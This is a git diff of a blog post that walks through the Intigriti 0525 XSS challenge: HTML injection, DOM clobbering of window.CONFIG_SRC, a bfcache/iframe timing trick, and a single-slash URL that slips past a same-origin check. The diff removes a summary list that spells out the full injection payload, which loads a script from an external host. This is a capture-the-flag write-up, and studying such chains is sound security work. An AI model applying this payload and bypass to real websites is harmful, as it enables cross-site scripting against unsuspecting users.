@@ -2,6 +2,10 @@
 title: "Beyond the Confetti: Hacking Intigriti Challenge 0525 with DOM Clobbering and a Single Slash"
 date: 2025-05-16T00:00:00-03:00
 draft: false
+cover:
+    image: "/img/intigriti-0525-writeup/accepted.png"
+    alt: "Intigriti Challenge 0525"
+    caption: "Intigriti Challenge 0525"
 ---
 
 # Introduction
@@ -153,7 +157,7 @@ Therefore, if we URL-encode this payload and construct the following URL: `?name
 
 Well, not so fast. Did you really think it would be that easy? When we use this payload, the confetti still rains down. This shouldn’t happen if `window.CONFIG_SRC` was successfully clobbered, as `/confetti.js` only loads when `window.CONFIG_SRC` is unavailable. Our injected HTML should make it available.
 
-# Don't Let the Thread Nap
+# Timing is Everything
 
 Timing is everything. When the payload is sent, the JavaScript makes a request to `/message`, which takes approximately three seconds to resolve. During this wait, the JavaScript thread is considered idle, causing `addDynamicScript` to execute before the DOM Clobbering payload is added to the page. The next challenge is to either expedite the `/message` request so it doesn't trigger the idle state prematurely, or to delay the idle callback until the HTML injection has been loaded.
 
@@ -259,6 +263,8 @@ To experiment with this bfcache idea, I created a simple test page. The code bel
 </html>
 ```
 
+It works! And even better, this technique performs beautifully on both Chrome and Firefox, without depending on race conditions or outright sorcery. We now have a rock-solid way of triggering our DOM Clobbering.
+
 This manual, button-click approach was useful for testing, but a more practical exploit wouldn't rely on user interaction. After I shared my `window.open` PoC, [@stealthcopter](https://x.com/stealthcopter) pointed out it could be automated using an `iframe`. This way, the entire process of loading the challenge page with the payload, waiting, and then triggering the back navigation (via an intermediate redirect of the `iframe`'s source to `back.html`) can happen silently in the background.
 
 Here’s how that `iframe`-based approach looks:
@@ -278,8 +284,6 @@ Here’s how that `iframe`-based approach looks:
 
 </html>>
 ```
-
-It works! And even better, this technique performs beautifully on both Chrome and Firefox, without depending on race conditions or outright sorcery. We now have a rock-solid way of triggering our DOM Clobbering.
 
 > By the way, this is not the intended solution!
 
@@ -378,11 +382,5 @@ Perfect! The same URL string yields two different origins based on how `new URL(
 So, there you have it! What started as a "quick look" at Johan's latest Intigriti challenge turned into a fascinating deep dive spanning over a day. We navigated the intricacies of `DOMPurify` (thankfully, with default settings allowing some HTML), wrestled with the timing of `requestIdleCallback`, and ultimately tamed it using a neat bfcache trick involving `iframe` navigation to ensure our DOM Clobbering payload for `window.CONFIG_SRC` landed before `addDynamicScript` could fetch the default confetti script.
 
 The final boss was the `safeURL` function, designed to keep loaded scripts within the same origin. The key was realizing the subtle but critical difference in how `new URL(src, location)` (in `safeURL`) and `new URL(src)` (in `addDynamicScript`) parse URLs. By crafting a payload like `https:/poc.vitorfalcao.com/intigriti.js` (note the single slash!), we made the `safeURL` check see it as a same-origin path relative to `location.origin`, while `addDynamicScript` interpreted it as an absolute URL to an external domain.
-
-The complete attack chain involved:
-1.  Injecting HTML via the `name` parameter: `?name=<span id="CONFIG_SRC" data-url="https:/poc.vitorfalcao.com/intigriti.js">test</span><strong>test` (with a trailing space to satisfy the initial regex, and ensuring the `strong` tag from the server response was properly handled).
-2.  Using an `iframe` to load the challenge page with this payload.
-3.  After a delay (to allow the fetch and DOM injection), redirecting the `iframe` to a `back.html` page which then uses `history.go(-1)` to navigate back. This bfcache-powered return ensured our clobbered `CONFIG_SRC` was active.
-4.  The `addDynamicScript` then executed, its `safeURL` check was bypassed by our crafted URL, and `script.src` was set to our external malicious script, leading to glorious XSS.
 
 This challenge was a brilliant reminder of how seemingly small details in JavaScript execution, DOM manipulation, and URL parsing can combine to create exploitable vulnerabilities. Huge props to Johan for another mind-bending puzzle! And yes, the confetti finally stopped.
